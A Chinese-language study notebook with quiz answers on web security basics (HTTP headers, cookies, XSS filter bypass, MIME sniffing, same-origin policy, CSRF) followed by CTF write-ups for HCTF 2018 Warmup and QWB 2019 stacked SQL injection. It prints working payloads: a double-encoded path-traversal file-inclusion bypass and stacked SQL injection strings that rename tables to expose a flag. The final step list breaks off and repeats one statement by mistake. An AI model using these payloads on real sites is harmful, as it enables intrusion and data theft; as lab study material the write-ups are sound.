## 入门视频三

**1.http报文的结构是什么？（1分）**

```
报文首部  空行 报文实体
```

 **2.什么是crlf？在http报文的哪个位置。（1分）**

```
crlf就是其中的回车和换行，在http当中http的header和body之间就是两个crlf进行分隔的。
```

 **3.解释下这几个头的含义（5分**）

 ![img](https://uploader.shimo.im/f/g5F6pOxn3T93mirM.png!thumbnail) 

```
Host：表明哪个主机将实际处理该请求

Accept：客户端指示接受哪些mine类型，在这种情况下通常用于指定JSON或XML输出web服务

Cookie：包含客户端向服务器传递的cookie数据

Refer：告诉服务器该请求具体是从哪个页面链接过来的

Authorization：它通常用来做一些token认证，它形式多样，如NT架构的NTLM登录认证，以及经常常用的“基本验证方案”HTTP Basic Authentication。它不做任何加密形式的验证，而仅只对用户名做一个简单的，形如username:password配对的base64编码。
```

**4.cookie具有哪些特点，不同的域名和子域名对cookie有怎样的权限？Cookie的Secure和 HTTPOnly这两个flag分别有什么作用？请结合xss攻击来进行说明（3分）**

cookie是服务器存储的关键值数据对数据，在客户端停留固定的一段时间。Cookie源于服务端的Set-Cookie分配更新或浏览器内置的JavaScript设置，然后随请求一起附带发送到它们的请求作用域。每种Cookie都有和服务器匹配的所属域模式。有时候是一个指定域名，有时候则是服务器端的根域名，如果指定域名后，它们同样适用于目标域名的子域名。

```
cookie访问权限

如果set-Cookie指定Domain属性（限定域）为example.com，那么example.com的子域名同样能访问获取到这个Cookie，而如果Cookie的限定域为某子域名（如sub.example.com)，那么只有该子域名和它的下级子域名才可以访问获取到该Cookie。

限定域设置权限

子域名可将Cookie限定域设置为它的下级子域名或父域名，但却不能把它设置为它的兄弟子域名，这也就是说，这里的子域名test.example.com，由于它的父域名为example.com，所以可设置限定域为example.com
而且也可以设置限定域为它的下级子域名，如这里的foo.test.example.com，但却不能设置为它的兄弟域名，如这里的test2.example.com

secure：该cookie仅在HTTPS页面上有效。

HTTPOnly：该cookie不能被javascript读取。为了确保cookie只能通过web请求传输。原本可用document.cookie方法的JavaScript脚本，去获取作用域内分配的所有Cookie相关信息。
```

```
现在通常都用HTML5规范来解析HTML，有时HTML不完全由客户端浏览器解析，它还可能由服务器WAF防火墙来解析处理。如果WAF与客户端浏览器的解析结果不一致，也就间接地反映出Web应用存在安全漏洞。以xss攻击说明，在xss攻击时，不使用</script>作为标记名，我们使用</script/xss>，在一些没有很好的过滤用户输入的内容的应用程序，它不能将</script/xss识别为</script>标签，但浏览器的HTML解析器，将会将它替换为空格。
```

 **5.简述本视频提到的xss绕过web防火墙的方案（5分）**

```
如果页面中存在一个script标签，HTML5规范规定浏览器会在结尾的时候对它进行闭合，如果不闭合将会带来语法错误，

但如果是xss的url攻击构造，那就不能从中获取前述的斜杠了，因为自动闭合后会是一个路径分割符。

如果某个标签的闭角符号不存在，它会与下一个标签的闭合符号进行自动闭合匹配，最终会与一些无关标签或其他属性实现结束。但是大多数浏览器都会把在标签中，设置另一开放符号认为是有效的。

使用封装协议来封装script标签，配合一组尖括号，就能有效绕过WAF，并得以正确解析。
```

 **6.内容嗅探是什么？主要有哪些类型？请分别举例，主要用途是什么？在什么情况下可以利用这些漏洞？。为什么facebook等网站需要使用不同的域名来存储图片？（5分）**

内容嗅探就是浏览器在显示响应回来的请求文件或网页时，不知道该文件或网页的具体内容类型，此时浏览器就会启动内容嗅探机制。典型示例就是我们现在称的MIME Sniffing，它的原理就是浏览器会先自动探测未知格式的请求文件类型，另一个例子就是编码嗅探（Encoding Sniffing）浏览器会自动检测未知格式文件的编码类型（Charset），看它是否为ASCII utf-8 Shift-JIS等编码格式，通过这种对内容编码的嗅探，进行一一匹配，然后在浏览器中执行相应的解析显示。

在一些企业版的IE6或IE7漏洞中，浏览器除了检测请求的Content-Type外（Content-Type 缺失或错误的情况下），它还会去自动检测请求文件的内容，如果其中包含一些HTML标记，浏览器就会把它当成HTML解析处理。在ie6或者ie7中如果没有对响应图片或文本指定适当的MIME类型（Content-Type），而图片或文本却包含了HTML内容，那浏览器最后也会把它当成HTML执行解析，所以这样就可以通过存储形式，轻易在IE6或IE7中实现XSS攻击。

假设通过某网站上传个人资料图片时，然后我们在图片中写入一些HTML内容，可以触发前述的MIME Sniffing，那么攻击者就可以通过上传包含HTML内容的图片，让目标应用或受害者把它当成一张正常图片看待。这样一来攻击者就能以此执行文件上传上下文环境的任意相关代码。这就是facebook使用单独子域来托管用户上传图片视频等文件的原因。

 **7.同源策略是什么？限制是什么？浏览器在遇到哪两种情况的时候会用到同源策略？如何放松SOP限制？放松SOP限制会对浏览器插件安全造成怎样的破坏？** 

同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所以a.com下的js脚本采用ajax读取b.com里面的文件数据是会报错的。

同源策略的限制是源匹配，源（origin）就是协议、域名和端口号。

浏览器在遇到这两种情况的时候会用到同源策略：AJAX请求（通过XML的HTTP请求来实现交互），打开一个带JS脚本的新窗口。

放宽同源策略的方法，可以设置不同域之间的document.domain脚本来实现，这种方法可以让本质上不同源的子域，实现互相通信交互。另外也可用postMessage方法，实现跨窗口通信。这些SOP弱化方式都可能是不同的攻击途径，它们会导致一些不可控的安全风险，像对浏览器插件安全来说破坏了浏览器沙箱，所以很多时候导致XSS攻击。

**8.csrf是什么？如何设计规避csrf？视频中提到的错误的csrf配置方法是什么？**

CSRF（跨站请求伪造）也就是攻击者挟持受害者，去访问由攻击者控制的网站，并以受害者身份执行请求提交等恶意操作。

**设计规范csrf**：我们要让后端知晓该请求的具体发起源，到底来自它的前端页面很少其他地方。方式就是CSRF Token，基本方法就是随机生成一个令牌（token）把其附加到用户的会话中，并嵌入到用户会话的所有生成表单中，每个生成表单都会附加发送该CSRF Token.后端服务器接收到一个POST请求时，它就会去检查，当前的CSRF Token是否与之前保存在用户会话Session或Token一致。

**错误的csrf配置方法：**如果后端会对GET请求页面做状态改变操作，会存在CSRF攻击风险。web应用附带了动态的CSRF验证形式，它们不会在每一个表单中，去验证是否与服务器端存在相同的CSRF Token，而是在每个表单中包含CSRF Token，这样每次提交表单，都要在服务器生成一个新的Token，所以除使用用户外都无法保存该Token，因为这确实在其中包含了一个特定的用户Token，这种机制的运行方式是会从服务器端加载一个名为csrf.js的文件，然后每个页面都会加载该文件，这确实会在页面或其作用域中，添加进一个带CSRF Token的变量，然后也会向页面表单中添加CSRF Token，以此页面所以相关表单有效，这种以文件方式添加CSRF Token的解决方案乍看非常合理，但如果就这样把CSRF Token存储在JS文件中，都把CSRF Token生成机制泄露了。

 **附加题：5、6两点主要利用的是由于服务端和客户端对同一信息的处理方式不同造成的漏洞，你还能举出相似的例子么？（1分）**

## [HCTF 2018]Warmup

源码：

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            //第一个过滤，page不能为空，也不能是字符串
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
            //第二个过滤，in_array() 函数搜索数组中是否存在指定的值，即page的取值只能为source.php或者hint.php
            if (in_array($page, $whitelist)) {
                return true;
            }
            //在$page后面拼接一个问号，并取值0到?中间的内容，如果$page本身没有?,则$page的值没有改变，如果$page本身有？，则$page会被截断
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            
            //第三个过滤，$page被截断后的值为source.php和hint.php
            if (in_array($_page, $whitelist)) {
                return true;
            }

          //对$_page进行url解码
            $_page = urldecode($page);
            //再次截取从开始到?直接的字符串
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            
            //再次需要$_page为source.php或hint.php
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }


    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>

```

定义了一个类，类中有一个checkFile方法

```php
 if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
```

request变量默认情况下包含了$_GET,$_POST,$_COOKIE的数组。

要求是传入一个file参数，不能为空，将file参数传入checkFile方法

include函数是我们要利用的一个函数，include() 函数可获得指定文件中的所有文本，并把文本拷贝到使用 include 函数的文件中。

首先，传入hint.php,提示 flag not here, and flag in ffffllllaaaagggg

也就是include要打开的文件为ffffllllaaaagggg

问题就变成了如何让include打开这个文件，就是要绕过checkFile方法的过滤，让 emmm::checkFile($_REQUEST['file'])为true

第一个我想可以利用的知识点为00截断，但测试发现利用不了

截断漏洞出现的核心就是chr(0)，这个字符不为空 (Null)，也不是空字符 (“”)，更不是空格。当程序在输出含有 chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。

最后发现%00截断是因为遇到了文件包含函数才会发送截断，所以在这道题中利用不了这个点。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/3.png)

这里在包含时出现了一个警告，但可以发现是要打开'buu2.php'，错误的原因可以出现在php.ini文件上，具体怎么修改暂时我还没有找到解决方法。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/4.png)

第二个我想到可以利用的点是&，因为&与url规范冲突，所以&后面的数据会被截断。这个截断是发生在URL截断，不符合我们的要求。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/5.png)

想到截断是因为要求我们输入source.php或者hint.php，而我们的目标是ffffllllaaaagggg，一开始的想法是我们输入的参数还有source.php或者hint.php,然后截断的时候剩下ffffllllaaaagggg

但是in_array() 函数搜索数组中是否存在指定的值要求是一样的，而不仅是有相同字母出现，也就是说我们可以传入source.php或者hint.php，但不能还带有其他字符，更何况是在url截断，经过in_array函数和include函数时的参数是一模一样的，所以这个想法是肯定行不通的。

继续观察源码， `$_page = urldecode($page);`和  `$_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );`

在这道题中应该是可以利用的点，要让 emmm::checkFile($_REQUEST['file'])为true，我一开始想着是需要满足四个过滤，但后来发现不用，因为像没有满足第二个过滤的话并没有return fault，而是程序继续往下执行。第二，第三，第四个过滤只要满足其中一个过滤就能返回true。

综上，满足第二个过滤并不能成功打开ffffllllaaaagggg文件，跳过这个过滤，这个过滤结束有一个 `$_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );`

文件名中是不能含有？的，所以这里的问号应该是截取字符串的作用。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/2.jpg)

满足第二个过滤，但是file仍然是我们输入的内容,file的值并不等于$_page的值。满足第二个过滤并不能满足我们的要求，继续往下，` $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );`

对$_page进行url解码，然后再一次截取$_page问号之前的内容。综上，满足第三个过滤经过了截取，url解码，截取。

如果经过$_page经过截取，url解码，截取后为hint.php或者source.php，且传入file参数的内容可以打开ffffllllaaaagggg文件，就能解决这道题。

由于文件名是不能包含问号的，而$_page又经过截取0到?之间的字符和url解码，容易想到我们可以对？进行url编码。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/1.jpg)

由于$_page在传入url的时候会进行一次url解码，在第三次过滤前又进行了一次url解码，很容易想到要对?进行url二次编码。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/6.png)

到这里，我们可以尝试构造payload

```
source.php%25%33%66../../../flag
```

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/7.png)

最终这道题的payload：

```
source.php?file=hint.php%253f../../../../../ffffllllaaaagggg
```

## [强网杯2019]随便注

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/9.png)

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/10.png)

输入1,2会返回，3之后就返回空白。0与负值也是空白。但输入`0' or 1=2 #` 返回空白，输入`0' or 1=1#`成功返回，通过这个想到根据返回页面的内容来判断我们的输入是否正确，例如输入

```
0' or substr(database(),1,1)='a' #
```

但无论怎么改变a的值，返回结果均为空白。

不知道具体是什么原因，猜想是没有选择数据库。

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/11.png)

接着发现union select被过滤，但现在最主要的问题是不能判断数据库就没有办法进行接下来的操作。

通过查看wp，发现可以利用堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。我们可以在；后面继续输入语句达到查询两条SQL语句的效果。

从什么测试可知，参数的闭合符号为单引号。

在平时中，遇到的最多的sql语句查询是select语句，但这道题，过滤了 select 和 where ，查看wp可以使用 show 来爆出数据库名，表名，和列名。

```sql
show datebases; //数据库。

show tables; //表名。

show columns from table; //字段。
```

```
0';show tables;#
```

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/13.png)

```
0';show columns from words;
```

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/12.png)

```
不能使用 0';show columns from 1919810931114514;#

表名为数字时，要用反引号包起来查询

应为0';show columns from `1919810931114514`;#
```

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/14.png)

可以看到这里有两张表，words表有两个字段，分别为id和data；1919810931114514表有一个字段，为flag。

因为输入1时，返回的页面如下：

![](https://zhuang-yongyi.gitee.io/yoyo/nep/BUU/15.png)

1表示的是id=1,输出的是id=1时的字段内容。

所以输入id=1时，服务器执行的语句为select * from words where id=1或select data from words where id=1

担我们现在需要输出的flag的内容，所以需要执行以下骚操作

```
1.将words表改名为word1或其它任意名字  //rename table words to word1

2.1919810931114514改名为words  //rename table 1919810931114514 to words

3.将新的words表插入一列，列名为id  //alter table words add id int unsigned not Null auto_increment primary key;

4.将flag列改名为data   //alter table words add id int unsigned not Null auto_increment primary key;
```

